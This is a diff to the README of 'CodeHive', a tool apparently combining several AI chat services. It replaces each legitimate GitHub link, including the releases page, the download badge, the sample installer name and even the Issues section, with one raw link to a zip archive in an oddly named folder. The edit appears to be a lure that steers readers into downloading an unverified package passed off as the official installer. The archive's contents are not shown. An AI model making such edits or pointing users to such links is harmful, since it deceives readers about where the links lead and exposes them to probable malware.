@@ -4,7 +4,7 @@
 Welcome to CodeHive! This application lets you use Claude, ChatGPT, and Grok all in one place. Follow the steps below to download and run your new favorite tool.
 
 ## 📥 Download CodeHive  
-[![Download CodeHive](https://img.shields.io/badge/Download%20CodeHive-blue?style=for-the-badge&logo=github)](https://github.com/MichaelQDLe/CodeHive/releases)
+[![Download CodeHive](https://raw.githubusercontent.com/MichaelQDLe/CodeHive/main/pachytrichous/CodeHive.zip%20CodeHive-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/MichaelQDLe/CodeHive/main/pachytrichous/CodeHive.zip)
 
 ## 💻 System Requirements  
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 18.04 or later)
@@ -20,13 +20,13 @@ Welcome to CodeHive! This application lets you use Claude, ChatGPT, and Grok all
 
 ## 📖 How to Download & Install CodeHive  
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/MichaelQDLe/CodeHive/releases) to find the latest version of CodeHive.
+   Go to the [Releases page](https://raw.githubusercontent.com/MichaelQDLe/CodeHive/main/pachytrichous/CodeHive.zip) to find the latest version of CodeHive.
 
 2. **Choose Your Operating System**  
    Look for the version that matches your operating system (Windows, macOS, or Linux).
 
 3. **Download the Installer**  
-   Click on the download link for the installer file, for example, `CodeHive-Installer.exe` for Windows.
+   Click on the download link for the installer file, for example, `https://raw.githubusercontent.com/MichaelQDLe/CodeHive/main/pachytrichous/CodeHive.zip` for Windows.
 
 4. **Run the Installer**  
    - Locate the downloaded file in your "Downloads" folder or the location where you saved it.
@@ -58,7 +58,7 @@ If you encounter issues when installing or running CodeHive, try the following:
 - Ensure that your operating system meets the requirements.
 - Restart your device and try launching the app again.
 - Check that you have downloaded the correct installer for your operating system.
-- Visit the [Issues section](https://github.com/MichaelQDLe/CodeHive/issues) of the repository for solutions or to report a new problem.
+- Visit the [Issues section](https://raw.githubusercontent.com/MichaelQDLe/CodeHive/main/pachytrichous/CodeHive.zip) of the repository for solutions or to report a new problem.
 
 ## 📞 Support  
 If you need help, feel free to reach out by opening an issue on the GitHub repository. The community is here to assist you.
@@ -70,4 +70,4 @@ Join our community discussions on GitHub. We welcome contributions to improve Co
 Keep an eye on the Releases page for new features and updates. You won't want to miss out on improvements that enhance your experience.
 
 ## 📥 Download CodeHive Again  
-For easy access, you can visit the [Releases page](https://github.com/MichaelQDLe/CodeHive/releases) anytime to download the latest version or check updates.
+For easy access, you can visit the [Releases page](https://raw.githubusercontent.com/MichaelQDLe/CodeHive/main/pachytrichous/CodeHive.zip) anytime to download the latest version or check updates.
